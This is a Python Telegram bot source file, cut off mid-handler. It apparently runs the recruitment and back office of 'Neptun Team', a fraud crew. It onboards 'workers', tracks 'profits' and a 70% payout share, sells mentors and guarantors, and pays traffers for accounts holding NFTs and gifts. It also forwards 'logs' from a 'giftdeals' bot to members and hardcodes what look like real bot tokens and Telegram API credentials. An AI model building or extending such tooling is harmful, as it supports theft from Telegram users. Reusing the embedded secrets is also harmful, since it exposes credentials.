import asyncio
import logging
import json
import os
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ════════════════════════════════════════════
BOT_TOKEN  = "8620670750:AAFtDzSKPb2nlnZH7ogM6EHdKyIrtdYnu6M"
LOG_BOT_TOKEN = "8767675859:AAGLXINsiVGd1wYg5EEhH98Vhv1AWgHRYRU"
ADMIN_ID   = 8726084830
USERS_FILE    = "users.json"
SETTINGS_FILE = "settings.json"
PROFILES_FILE = "profiles.json"
TEAM_FILE     = "team.json"          # общая касса и т.д.

API_ID   = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
# ════════════════════════════════════════════

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot     = Bot(token=BOT_TOKEN)
log_bot = Bot(token=LOG_BOT_TOKEN)
dp      = Dispatcher(storage=MemoryStorage())


# ══════════════════ ХРАНИЛИЩЕ ══════════════════

def _load(path, default):
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return default

def _save(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_users():    return _load(USERS_FILE, [])
def save_users(d):   _save(USERS_FILE, d)

def load_settings(): return _load(SETTINGS_FILE, {"invite_link": None})
def save_settings(d):_save(SETTINGS_FILE, d)

def load_profiles(): return _load(PROFILES_FILE, {})
def save_profiles(d):_save(PROFILES_FILE, d)

def load_team():
    return _load(TEAM_FILE, {
        "total_profit": 13648.0,
        "otchuk_users": {}   # {str(user_id): forward_chat_id}
    })
def save_team(d): _save(TEAM_FILE, d)

def add_user(uid: int):
    users = load_users()
    if uid not in users:
        users.append(uid)
        save_users(users)

def get_profile(uid: int) -> dict:
    profiles = load_profiles()
    return profiles.get(str(uid), {})

def save_profile(uid: int, profile: dict):
    profiles = load_profiles()
    profiles[str(uid)] = profile
    save_profiles(profiles)


# ══════════════════ ЭМОДЗИ ══════════════════
# Custom emoji через tg-emoji (работает только в Premium аккаунтах/ботах с поддержкой)
def ce(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

E_1    = ce("5408894951440279259", "1️⃣")
E_2    = ce("5411585799990830248", "2️⃣")
E_3    = ce("5409189019261103031", "3️⃣")
E_4    = ce("5411500398861118321", "4️⃣")
E_OK   = ce("5906891238270834298", "🟢")
E_USER = ce("5906581476639513176", "👤")
E_GEAR = ce("5906513053515519760", "⚙️")
E_MON  = ce("5904576890848419790", "💰")
E_BRAIN= ce("5906642705693284735", "🧠")
E_HAND = ce("5906986955911993888", "🤝")
E_RED  = ce("5906725061691185184", "🔴")
E_YEL  = ce("5906986968796895005", "🟡")
E_BACK = ce("5877629862306385808", "◀️")
E_LINK = ce("5906839307821259375", "🔗")
E_EXCL = ce("5906884044200614612", "❗️")
E_EYE  = ce("5906853781861046999", "👁")
E_Q    = ce("5906952733612579003", "❓")


# ══════════════════ СОСТОЯНИЯ ══════════════════
class Form(StatesGroup):
    q1_source     = State()
    q2_experience = State()
    q3_hours      = State()

class ProfileSetup(StatesGroup):
    ton_address    = State()
    crypto_address = State()

class AdminState(StatesGroup):
    waiting_link        = State()
    waiting_broadcast   = State()
    waiting_status_uid  = State()
    waiting_status_val  = State()
    waiting_mentor_uid  = State()
    waiting_mentor_val  = State()
    waiting_profit_add  = State()

class OtchukState(StatesGroup):
    waiting_token = State()

class PayState(StatesGroup):
    waiting_amount = State()
    waiting_comment = State()


# ══════════════════ КЛАВИАТУРЫ ══════════════════

def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=f"{E_USER} Профиль",    callback_data="menu_profile"),
            InlineKeyboardButton(text=f"{E_GEAR} Отстук",     callback_data="menu_otchuk"),
        ],
        [
            InlineKeyboardButton(text=f"{E_MON} Подписка",    callback_data="menu_sub"),
            InlineKeyboardButton(text=f"{E_BRAIN} Информация", callback_data="menu_info"),
        ],
    ])

def back_kb(cb: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data=cb)]
    ])

def approve_kb(uid: int):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Принять",   callback_data=f"approve_{uid}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{uid}"),
    ]])

def admin_kb():
    settings = load_settings()
    link = settings.get("invite_link")
    link_text = (f"✅ Ссылка: {link[:30]}..." if link and len(link) > 30
                 else f"✅ Ссылка: {link}" if link
                 else "🔗 Задать ссылку")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=link_text,              callback_data="admin_set_link")],
        [InlineKeyboardButton(text="📢 Рассылка",          callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="👥 Пользователей",     callback_data="admin_users")],
        [InlineKeyboardButton(text="🏷 Изменить статус",   callback_data="admin_status")],
        [InlineKeyboardButton(text="🧑‍🏫 Назначить наставника", callback_data="admin_mentor")],
        [InlineKeyboardButton(text="💵 Добавить профит",   callback_data="admin_profit")],
    ])

def info_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E_HAND} Цена услуг",      callback_data="info_prices")],
        [InlineKeyboardButton(text=f"{E_HAND} Наставники",      callback_data="info_mentors")],
        [InlineKeyboardButton(text=f"{E_Q} Что у нас имеется?", url="https://t.me/+r50aYgI6r-w1OWRh")],
        [InlineKeyboardButton(text=f"{E_EYE} Мануал",           callback_data="info_manual")],
        [InlineKeyboardButton(text=f"{E_LINK} Канал",           url="https://t.me/Neptun_Newss")],
        [InlineKeyboardButton(text=f"{E_USER} Владелец",        url="https://t.me/locerc")],
        [InlineKeyboardButton(text=f"{E_EXCL} Правила",         callback_data="info_rules")],
        [InlineKeyboardButton(text="🚗 Траф",                   callback_data="info_traf")],
        [InlineKeyboardButton(text=f"{E_BACK} Назад",           callback_data="back_main")],
    ])

def manual_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E_1} Мануал ручение", callback_data="manual_1")],
        [InlineKeyboardButton(text=f"{E_2} Мануал гарант",  url="https://t.me/c/3824675753/2")],
        [InlineKeyboardButton(text=f"{E_3} Мануал отс",     url="https://t.me/c/3824675753/5")],
        [InlineKeyboardButton(text=f"{E_4} Мануал парсер",  url="https://t.me/c/3824675753/6")],
        [InlineKeyboardButton(text=f"{E_BACK} Назад",       callback_data="info_back")],
    ])

def otchuk_kb(connected: bool):
    rows = []
    if not connected:
        rows.append([InlineKeyboardButton(text=f"{E_OK} Подключить", callback_data="otchuk_connect")])
    else:
        rows.append([InlineKeyboardButton(text=f"{E_RED} Отключить", callback_data="otchuk_disconnect")])
    rows.append([InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="back_main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def sub_kb(has_balance: bool):
    rows = []
    if not has_balance:
        rows.append([InlineKeyboardButton(text="➕ Пополнить баланс", callback_data="sub_topup")])
    rows.append([InlineKeyboardButton(text=f"{E_YEL} Оплатить подписку", callback_data="sub_pay")])
    rows.append([InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="back_main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def profile_kb(uid: int):
    p = get_profile(uid)
    rows = []
    if not p.get("ton_address"):
        rows.append([InlineKeyboardButton(text="➕ Добавить TON адрес",        callback_data="profile_set_ton")])
    if not p.get("crypto_address"):
        rows.append([InlineKeyboardButton(text="➕ Добавить Crypto Bot адрес", callback_data="profile_set_crypto")])
    if not p.get("mentor"):
        rows.append([InlineKeyboardButton(text="➕ Добавить наставника",       callback_data="profile_req_mentor")])
    rows.append([InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="back_main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ══════════════════ ВАЛИДАЦИЯ ══════════════════

def is_valid_ton(addr: str) -> bool:
    # TON адрес: начинается с EQ или UQ, длина 48 символов
    addr = addr.strip()
    return (addr.startswith("EQ") or addr.startswith("UQ")) and len(addr) == 48

def is_valid_crypto_bot(addr: str) -> bool:
    # CryptoBot адрес начинается с CB и состоит из букв/цифр, длина 10-20
    addr = addr.strip()
    return addr.startswith("CB") and 8 <= len(addr) <= 24


# ══════════════════ /START ══════════════════

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    add_user(uid)

    p = get_profile(uid)
    # Если уже принят — показываем главное меню
    if p.get("accepted"):
        await message.answer(
            f"👋 С возвращением, <b>{message.from_user.first_name}</b>!",
            parse_mode="HTML",
            reply_markup=main_kb()
        )
        return

    await message.answer(
        "Для принятия заявки в тиму ответь на несколько вопросов",
        parse_mode="HTML"
    )
    await asyncio.sleep(0.3)
    await message.answer(
        f"{E_1} Откуда вы узнали о нас?",
        parse_mode="HTML"
    )
    await state.set_state(Form.q1_source)


# ══════════════════ АНКЕТА ══════════════════

@dp.message(Form.q1_source)
async def q1(message: Message, state: FSMContext):
    await state.update_data(source=message.text)
    await message.answer(f"{E_2} Какой у вас опыт?", parse_mode="HTML")
    await state.set_state(Form.q2_experience)

@dp.message(Form.q2_experience)
async def q2(message: Message, state: FSMContext):
    await state.update_data(experience=message.text)
    await message.answer(f"{E_3} Сколько часов ты готов уделять в день?", parse_mode="HTML")
    await state.set_state(Form.q3_hours)

@dp.message(Form.q3_hours)
async def q3(message: Message, state: FSMContext):
    await state.update_data(hours=message.text)
    data = await state.get_data()
    await state.clear()

    user = message.from_user
    username = f"@{user.username}" if user.username else "нет юзернейма"

    await message.answer(
        "✅ <b>Заявка отправлена!</b>\n\nОжидай ответа от администратора.",
        parse_mode="HTML"
    )
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            f"📋 <b>Новая заявка!</b>\n\n"
            f"👤 {user.full_name} ({username})\n"
            f"🆔 <code>{user.id}</code>\n\n"
            f"{E_1} <b>Откуда:</b> {data['source']}\n"
            f"{E_2} <b>Опыт:</b> {data['experience']}\n"
            f"{E_3} <b>Часов:</b> {data['hours']}"
        ),
        parse_mode="HTML",
        reply_markup=approve_kb(user.id)
    )


# ══════════════════ ПРИНЯТЬ / ОТКЛОНИТЬ ══════════════════

@dp.callback_query(F.data.startswith("approve_"))
async def cb_approve(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return

    uid = int(callback.data.split("_")[1])

    # Создаём одноразовую invite-ссылку через Telethon
    invite_link = await create_one_time_link(uid)

    p = get_profile(uid)
    p["accepted"]   = True
    p["status"]     = "Воркер"
    p["joined_at"]  = datetime.now().strftime("%d.%m.%Y %H:%M")
    p["balance"]    = 0.0
    p["turnover"]   = 0.0
    p["max_profit"] = 0.0
    save_profile(uid, p)

    msg_text = (
        f"{E_OK} <b>Поздравляю, ты принят!</b>\n\n"
        + (f"Вступай по ссылке (одноразовая):\n{invite_link}" if invite_link else
           "Администратор скоро свяжется с тобой.")
    )
    try:
        sent = await bot.send_message(uid, msg_text, parse_mode="HTML")
        # Отправляем главное меню
        await bot.send_message(uid, "Добро пожаловать в Neptun Team! 🎉",
                               reply_markup=main_kb())
    except Exception as e:
        logger.warning(f"Не удалось отправить {uid}: {e}")

    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>Одобрено</b>", parse_mode="HTML"
    )
    await callback.answer("✅ Принято!")


async def create_one_time_link(uid: int) -> str | None:
    """Создаёт одноразовую invite-ссылку через Telethon."""
    try:
        from telethon import TelegramClient
        from telethon.tl.functions.messages import ExportChatInviteRequest
        settings = load_settings()
        channel_id = settings.get("channel_id")  # числовой ID канала
        if not channel_id:
            return None

        async with TelegramClient("neptun_session", API_ID, API_HASH) as client:
            result = await client(ExportChatInviteRequest(
                peer=channel_id,
                expire_date=datetime.now() + timedelta(days=7),
                usage_limit=1,   # одноразовая
                request_needed=False
            ))
            return result.link
    except Exception as e:
        logger.error(f"Ошибка создания ссылки: {e}")
        return None


@dp.callback_query(F.data.startswith("decline_"))
async def cb_decline(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
    uid = int(callback.data.split("_")[1])
    try:
        await bot.send_message(
            uid,
            "😔 <b>Твоя заявка отклонена.</b>\n\nК сожалению, на данный момент мы не можем тебя принять.",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.warning(f"Не удалось отправить {uid}: {e}")
    await callback.message.edit_text(
        callback.message.text + "\n\n❌ <b>Отклонено</b>", parse_mode="HTML"
    )
    await callback.answer("❌ Отклонено!")


# ══════════════════ ГЛАВНОЕ МЕНЮ ══════════════════

@dp.callback_query(F.data == "back_main")
async def back_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        f"👋 Главное меню",
        parse_mode="HTML",
        reply_markup=main_kb()
    )
    await callback.answer()


# ══════════════════ ПРОФИЛЬ ══════════════════

@dp.callback_query(F.data == "menu_profile")
async def menu_profile(callback: CallbackQuery):
    uid = callback.from_user.id
    p = get_profile(uid)
    user = callback.from_user
    username = f"@{user.username}" if user.username else "нет"

    ton     = p.get("ton_address", "не указан")
    crypto  = p.get("crypto_address", "не указан")
    joined  = p.get("joined_at", "неизвестно")
    status  = p.get("status", "Воркер")
    mentor  = p.get("mentor", "не назначен")
    balance = p.get("balance", 0.0)
    turnover= p.get("turnover", 0.0)
    max_p   = p.get("max_profit", 0.0)

    text = (
        f"{E_USER} <b>Профиль</b>\n\n"
        f"<b>Имя:</b> {user.full_name}\n"
        f"<b>Юз:</b> {username}\n"
        f"<b>ID:</b> <code>{uid}</code>\n"
        f"<b>Время входа в тиму:</b> {joined}\n"
        f"<b>Статус:</b> {status}\n\n"
        f"<b>TON Адрес:</b> <code>{ton}</code>\n"
        f"<b>Crypto Bot Адрес:</b> <code>{crypto}</code>\n"
        f"<b>Наставник:</b> {mentor}\n\n"
        f"<b>Баланс:</b> {balance}$\n"
        f"<b>Оборот:</b> {turnover}$\n"
        f"<b>Максимальный профит:</b> {max_p}$\n"
        f"<b>Процент выплат:</b> 70%"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=profile_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "profile_set_ton")
async def profile_set_ton(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "Введи свой <b>TON адрес</b> (начинается с EQ или UQ, 48 символов):",
        parse_mode="HTML"
    )
    await state.set_state(ProfileSetup.ton_address)
    await callback.answer()

@dp.message(ProfileSetup.ton_address)
async def save_ton(message: Message, state: FSMContext):
    addr = message.text.strip()
    if not is_valid_ton(addr):
        await message.answer("❌ Невалидный TON адрес. Попробуй ещё раз:")
        return
    p = get_profile(message.from_user.id)
    p["ton_address"] = addr
    save_profile(message.from_user.id, p)
    await state.clear()
    await message.answer("✅ TON адрес сохранён!", reply_markup=main_kb())

@dp.callback_query(F.data == "profile_set_crypto")
async def profile_set_crypto(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "Введи свой <b>Crypto Bot адрес</b> (начинается с CB):",
        parse_mode="HTML"
    )
    await state.set_state(ProfileSetup.crypto_address)
    await callback.answer()

@dp.message(ProfileSetup.crypto_address)
async def save_crypto(message: Message, state: FSMContext):
    addr = message.text.strip()
    if not is_valid_crypto_bot(addr):
        await message.answer("❌ Невалидный Crypto Bot адрес (должен начинаться с CB). Попробуй ещё раз:")
        return
    p = get_profile(message.from_user.id)
    p["crypto_address"] = addr
    save_profile(message.from_user.id, p)
    await state.clear()
    await message.answer("✅ Crypto Bot адрес сохранён!", reply_markup=main_kb())

@dp.callback_query(F.data == "profile_req_mentor")
async def profile_req_mentor(callback: CallbackQuery):
    await callback.answer("Наставника назначает администратор. Обратись к @locerc", show_alert=True)


# ══════════════════ ОТСТУК ══════════════════

@dp.callback_query(F.data == "menu_otchuk")
async def menu_otchuk(callback: CallbackQuery):
    team = load_team()
    connected = str(callback.from_user.id) in team.get("otchuk_users", {})
    status_text = f"{E_OK} <b>Подключён</b>" if connected else f"{E_RED} <b>Не подключён</b>"

    text = (
        f"{E_GEAR} <b>Отстук</b>\n\n"
        f"Через отстук ты можешь перенаправить все логи лично тебе в лс через бота\n\n"
        f"<b>Объяснение:</b>\n"
        f"• создаёшь токен бота → пересылаешь его сюда → бот автоматически подключит бота "
        f"→ все логи приходят вам в лс!\n\n"
        f"Статус: {status_text}"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=otchuk_kb(connected))
    await callback.answer()

@dp.callback_query(F.data == "otchuk_connect")
async def otchuk_connect(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "Отправь токен твоего бота (формат: <code>123456:AAF...</code>):\n\n/cancel — отмена",
        parse_mode="HTML"
    )
    await state.set_state(OtchukState.waiting_token)
    await callback.answer()

@dp.message(OtchukState.waiting_token)
async def otchuk_save_token(message: Message, state: FSMContext):
    token = message.text.strip()
    # Валидация токена
    if ":" not in token or len(token) < 30:
        await message.answer("❌ Неверный формат токена. Попробуй ещё раз:")
        return

    uid = message.from_user.id
    team = load_team()
    team.setdefault("otchuk_users", {})[str(uid)] = {
        "token": token,
        "chat_id": uid
    }
    save_team(team)
    await state.clear()
    await message.answer(
        f"{E_OK} <b>Бот подключён!</b>\n\nТеперь все логи giftdeals бота будут приходить тебе в лс.",
        parse_mode="HTML",
        reply_markup=main_kb()
    )

@dp.callback_query(F.data == "otchuk_disconnect")
async def otchuk_disconnect(callback: CallbackQuery):
    uid = str(callback.from_user.id)
    team = load_team()
    team.get("otchuk_users", {}).pop(uid, None)
    save_team(team)
    await callback.message.edit_text(
        f"{E_RED} <b>Отстук отключён.</b>",
        parse_mode="HTML",
        reply_markup=main_kb()
    )
    await callback.answer("Отключено")


# ══════════════════ ПОДПИСКА ══════════════════

@dp.callback_query(F.data == "menu_sub")
async def menu_sub(callback: CallbackQuery):
    uid = callback.from_user.id
    p = get_profile(uid)
    balance = p.get("balance", 0.0)

    # Проверяем активную подписку
    sub_until = p.get("sub_until")
    if sub_until:
        until_dt = datetime.fromisoformat(sub_until)
        if until_dt > datetime.now():
            remaining = until_dt - datetime.now()
            hours = int(remaining.total_seconds() // 3600)
            await callback.message.edit_text(
                f"{E_MON} <b>Подписка</b>\n\n"
                f"{E_OK} Вы можете воркать без % ровно {hours} часов!!!",
                parse_mode="HTML",
                reply_markup=back_kb("back_main")
            )
            await callback.answer()
            return

    text = (
        f"{E_MON} <b>Подписка</b>\n\n"
        f"При оформлении подписки будете воркать без % 24 часа.\n\n"
        f"<b>Ваш баланс:</b> {balance}$\n\n"
        f"<b>Тарифы:</b>\n"
        f"• 24 часа — 5$\n"
        f"• 72 часа — 12$\n"
        f"• 7 дней — 25$"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=sub_kb(balance > 0))
    await callback.answer()

@dp.callback_query(F.data == "sub_topup")
async def sub_topup(callback: CallbackQuery):
    await callback.answer(
        "Для пополнения обратись к @locerc", show_alert=True
    )

@dp.callback_query(F.data == "sub_pay")
async def sub_pay(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        f"{E_YEL} <b>Оплата подписки</b>\n\n"
        "Выбери срок:\n"
        "• <code>24</code> — 24 часа (5$)\n"
        "• <code>72</code> — 72 часа (12$)\n"
        "• <code>168</code> — 7 дней (25$)\n\n"
        "Введи количество часов:",
        parse_mode="HTML"
    )
    await state.set_state(PayState.waiting_amount)
    await callback.answer()

@dp.message(PayState.waiting_amount)
async def pay_amount(message: Message, state: FSMContext):
    prices = {"24": 5, "72": 12, "168": 25}
    hours_str = message.text.strip()
    if hours_str not in prices:
        await message.answer("❌ Введи 24, 72 или 168:")
        return
    cost = prices[hours_str]
    uid = message.from_user.id
    p = get_profile(uid)
    balance = p.get("balance", 0.0)

    if balance < cost:
        await message.answer(
            f"❌ Недостаточно средств. Баланс: {balance}$, нужно: {cost}$\n"
            f"Пополни баланс через @locerc",
            reply_markup=main_kb()
        )
        await state.clear()
        return

    p["balance"] = round(balance - cost, 2)
    hours = int(hours_str)
    p["sub_until"] = (datetime.now() + timedelta(hours=hours)).isoformat()
    save_profile(uid, p)
    await state.clear()
    await message.answer(
        f"{E_OK} <b>Оплачено!</b>\n\nВы можете воркать без % ровно {hours} часов!!!",
        parse_mode="HTML",
        reply_markup=main_kb()
    )


# ══════════════════ ИНФОРМАЦИЯ ══════════════════

@dp.callback_query(F.data == "menu_info")
async def menu_info(callback: CallbackQuery):
    team = load_team()
    total = team.get("total_profit", 13648.0)
    text = (
        f"{E_BRAIN} <b>Neptun Team</b>\n\n"
        f"Мы открылись в ноябре 2025 года.\n\n"
        f"<b>Общая касса профитов:</b> {total:,.3f}$\n\n"
        f"Мы активно ищем:\n"
        f"• Гарантов\n"
        f"• Наставников\n"
        f"• Воркеров\n"
        f"• Траферов\n"
        f"• и тех кто готов сотрудничать\n\n"
        f"Если ты с нами — это уже обозначает что ты в команде лучших!"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=info_kb())
    await callback.answer()

@dp.callback_query(F.data == "info_back")
async def info_back(callback: CallbackQuery):
    await menu_info(callback)

@dp.callback_query(F.data == "info_prices")
async def info_prices(callback: CallbackQuery):
    text = (
        f"{E_HAND} <b>Цена услуг</b>\n\n"
        f"<b>Наставник</b> — касса 200$ / 25$ / 20 TON\n"
        f"<b>Гарант</b> — касса 150$ / 15$ / 18 TON\n"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E_YEL} Купить", callback_data="buy_service")],
        [InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="menu_info")],
    ])
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data == "buy_service")
async def buy_service(callback: CallbackQuery):
    await callback.answer("Для покупки обратись к @locerc", show_alert=True)

@dp.callback_query(F.data == "info_mentors")
async def info_mentors(callback: CallbackQuery):
    text = (
        f"{E_HAND} <b>Наставники</b>\n\n"
        f"Наставник — это опытный участник команды, который помогает новичкам "
        f"получить первые профиты и разобраться в работе.\n\n"
        f"За помощь наставник берёт <b>4%</b> от первых 3 профитов ученика."
    )
    await callback.message.edit_text(
        text, parse_mode="HTML",
        reply_markup=back_kb("menu_info")
    )
    await callback.answer()

@dp.callback_query(F.data == "info_rules")
async def info_rules(callback: CallbackQuery):
    text = (
        f"{E_EXCL} <b>Правила</b>\n\n"
        "1. Не оскорблять родных / религию / нацию\n"
        "2. Не обманывать своих\n"
        "3. Не создавать конфликт\n"
        "4. Не продавать giftdeals боты/коды и в общем не продавать коды и боты\n"
        "5. Не продавать акки TG и тому подобное\n"
        "6. Флуд / спам запрещён"
    )
    await callback.message.edit_text(
        text, parse_mode="HTML",
        reply_markup=back_kb("menu_info")
    )
    await callback.answer()

@dp.callback_query(F.data == "info_traf")
async def info_traf(callback: CallbackQuery):
    text = (
        "🚗 <b>Траф</b>\n\n"
        "Привет, юный трафер! Готовься переливать трафик по <b>0.4$</b>\n\n"
        "<b>Критерии:</b>\n"
        "1. Иметь самому не пустой профиль\n"
        "2. Лить в тиму не пустые акки — пример: должно быть что-то из этого: "
        "NFT, TGP, куча подарков, оформленный профиль и т.д.\n\n"
        "<b>Выплаты:</b> автоматические после проверки — 20 людей по ссылке."
    )
    await callback.message.edit_text(
        text, parse_mode="HTML",
        reply_markup=back_kb("menu_info")
    )
    await callback.answer()

@dp.callback_query(F.data == "info_manual")
async def info_manual(callback: CallbackQuery):
    await callback.message.edit_text(
        f"{E_EYE} <b>Мануал</b>\n\nВыбери нужный раздел:",
        parse_mode="HTML",
        reply_markup=manual_kb()
    )
    await callback.answer()

@dp.callback_query(F.data == "manual_1")
async def manual_1(callback: CallbackQuery):
    # Проверяем подписку на канал
    try:
        member = await bot.get_chat_member("@Neptun_Newss", callback.from_user.id)
        if member.status in ("left", "kicked"):
            raise Exception("not member")
    except Exception:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Подписаться", url="https://t.me/+r50aYgI6r-w1OWRh")],
            [InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="info_manual")],
        ])
        await callback.message.edit_text(
            "❌ Для доступа к мануалу нужно подписаться на канал!",
            reply_markup=kb
        )
        await callback.answer()
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📖 Читать мануал", url="https://t.me/c/3824675753/7")],
        [InlineKeyboardButton(text=f"{E_BACK} Назад", callback_data="info_manual")],
    ])
    await callback.message.edit_text(
        f"{E_1} <b>Мануал ручение</b>",
        parse_mode="HTML",
        reply_markup=kb
    )
    await callback.answer()


# ══════════════════ ЛОГИ ИЗ ДРУГОГО БОТА ══════════════════
# Запускаем отдельный polling для log_bot

log_dp = Dispatcher(storage=MemoryStorage())

@log_dp.message()
async def forward_log(message: Message):
    """Все сообщения в log_bot пересылаем подключённым пользователям."""
    team = load_team()
    otchuk = team.get("otchuk_users", {})
    for uid_str, info in otchuk.items():
        try:
            await message.forward(int(uid_str))
        except Exception as e:
            logger.warning(f"Не удалось переслать {uid_str}: {e}")


# ══════════════════ ADMIN PANEL ══════════════════

@dp.message(Command("admin"))
async def cmd_admin(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Нет доступа.")
        return
    await state.clear()
    await message.answer("⚙️ <b>Панель администратора</b>", parse_mode="HTML", reply_markup=admin_kb())

@dp.callback_query(F.data == "admin_set_link")
async def cb_set_link(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    await state.set_state(AdminState.waiting_link)
    await callback.message.answer(
        "🔗 Введи числовой ID канала (например <code>-1001234567890</code>)\n\n"
        "Бот будет создавать одноразовые ссылки в этот канал.\n/cancel — отмена",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(AdminState.waiting_link)
async def admin_save_link(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    text = message.text.strip()
    settings = load_settings()
    try:
        channel_id = int(text)
        settings["channel_id"] = channel_id
        save_settings(settings)
        await state.clear()
        await message.answer(f"✅ ID канала сохранён: <code>{channel_id}</code>", parse_mode="HTML", reply_markup=admin_kb())
    except ValueError:
        await message.answer("❌ Введи числовой ID канала:")

@dp.callback_query(F.data == "admin_broadcast")
async def cb_broadcast(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    users = load_users()
    await state.set_state(AdminState.waiting_broadcast)
    await callback.message.answer(
        f"📢 <b>Рассылка</b>\n\n👥 Получателей: <b>{len(users)}</b>\n\n"
        f"Напиши сообщение.\n/cancel — отмена",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(AdminState.waiting_broadcast)
async def admin_do_broadcast(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    await state.clear()
    users = load_users()
    status = await message.answer(f"📢 Отправляю... (0/{len(users)})")
    sent = failed = 0
    for i, uid in enumerate(users):
        try:
            await bot.send_message(uid, message.text, parse_mode="HTML")
            sent += 1
        except Exception:
            failed += 1
        if (i + 1) % 10 == 0:
            try: await status.edit_text(f"📢 Отправляю... ({i+1}/{len(users)})")
            except Exception: pass
        await asyncio.sleep(0.05)
    await status.edit_text(
        f"✅ <b>Готово!</b>\n📤 Отправлено: {sent}\n❌ Ошибок: {failed}",
        parse_mode="HTML", reply_markup=admin_kb()
    )

@dp.callback_query(F.data == "admin_users")
async def cb_admin_users(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    users = load_users()
    await callback.answer(f"👥 Пользователей: {len(users)}", show_alert=True)

@dp.callback_query(F.data == "admin_status")
async def cb_admin_status(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    await state.set_state(AdminState.waiting_status_uid)
    await callback.message.answer("Введи ID пользователя:")
    await callback.answer()

@dp.message(AdminState.waiting_status_uid)
async def admin_status_uid(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.strip())
        await state.update_data(target_uid=uid)
        await state.set_state(AdminState.waiting_status_val)
        await message.answer("Введи новый статус (например: Гарант, Наставник, Трафер):")
    except ValueError:
        await message.answer("❌ Введи числовой ID:")

@dp.message(AdminState.waiting_status_val)
async def admin_status_val(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    data = await state.get_data()
    uid = data["target_uid"]
    p = get_profile(uid)
    p["status"] = message.text.strip()
    save_profile(uid, p)
    await state.clear()
    await message.answer(f"✅ Статус пользователя {uid} обновлён: {p['status']}", reply_markup=admin_kb())

@dp.callback_query(F.data == "admin_mentor")
async def cb_admin_mentor(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    await state.set_state(AdminState.waiting_mentor_uid)
    await callback.message.answer("Введи ID пользователя:")
    await callback.answer()

@dp.message(AdminState.waiting_mentor_uid)
async def admin_mentor_uid(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.strip())
        await state.update_data(target_uid=uid)
        await state.set_state(AdminState.waiting_mentor_val)
        await message.answer("Введи юзернейм наставника (например @username):")
    except ValueError:
        await message.answer("❌ Числовой ID:")

